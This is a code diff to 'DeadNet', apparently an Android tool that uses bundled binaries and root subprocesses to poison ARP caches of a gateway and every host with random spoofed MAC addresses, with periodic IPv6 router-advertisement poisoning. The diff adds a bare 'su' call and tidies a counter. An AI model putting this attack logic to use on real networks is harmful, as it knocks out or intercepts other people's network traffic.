@@ -41,6 +41,7 @@ class DeadNet:
     }
 
     def __init__(self, iface, gateway_ipv4, gateway_ipv6, gateway_mac=None, print_mtd=None):
+        subprocess.call(["su"])  # test root
         self.network_interface = iface
         conf.iface = self.network_interface
 
@@ -54,12 +55,12 @@ class DeadNet:
         self.arch_type = self._BINARY_MAP.get(pt.machine())
         if not self.arch_type:
             raise Exception(f"unsupported device machine architecture -> {pt.machine()}")
+        
         # Get the full path to the binary
         arp_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'arp.{self.arch_type}')
         self.arp_path = f'/data/data/org.deadnet.deadnet/arp.{self.arch_type}'
         nra_orig_path2 = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'nra.{self.arch_type}')
         self.nra_path = f'/data/data/org.deadnet.deadnet/nra.{self.arch_type}'
-        # Start the binary as a new process
 
         for [src_path, bin_path] in [[arp_orig_path, self.arp_path],
                                      [nra_orig_path2, self.nra_path]]:
@@ -120,14 +121,11 @@ class DeadNet:
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
-        ra_step_count = 0
         for idx, host_ip in enumerate(self.host_ipv4s):
             if self.abort:
                 return
             if self.spoof_ipv6ra:
-                ra_step_count += 1
-                if ra_step_count % 5 == 0:
-                    ra_step_count = 0
+                if idx % 5 == 0:
                     self.poison_ra()
             subprocess.Popen(
                 f"su -c {self.arp_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
